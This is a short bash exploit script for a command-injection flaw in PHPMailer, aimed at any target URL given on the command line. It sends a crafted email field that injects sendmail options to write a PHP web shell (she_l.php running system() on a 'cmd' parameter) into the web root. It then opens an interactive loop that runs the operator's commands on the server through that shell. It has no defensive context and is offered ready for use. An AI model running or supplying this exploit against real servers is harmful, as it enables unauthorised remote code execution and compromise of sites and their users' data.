#!/bin/bash
# The exploitation of a command injection in the PHPMailer libraries. PHPMailer is used across a wide list of PHP projects. This vulnerability will provide you with a quick way to gain commands execution if the server relies on PHPMailer to send emails.
if [ $# -eq 0 ]
  then
    echo "Usage: ./exploit.sh [target]"
    exit 1
fi

echo "Exploiting..."
curl $1 \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: '$1'' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: '$1'' \
  -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7' \
  --data-raw 'email=%22attacker%40127.0.0.1%5C%22+-oQ%2Ftmp%2F+-X%2Fvar%2Fwww%2Fshe_l.php++root%22%40127.0.0.1&subject=tes&text=%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E' \
  --compressed \
  --insecure &>/dev/null
echo "Exploited."

while read cmd
do
	curl -L "$1/she_l.php?cmd=$cmd"
done
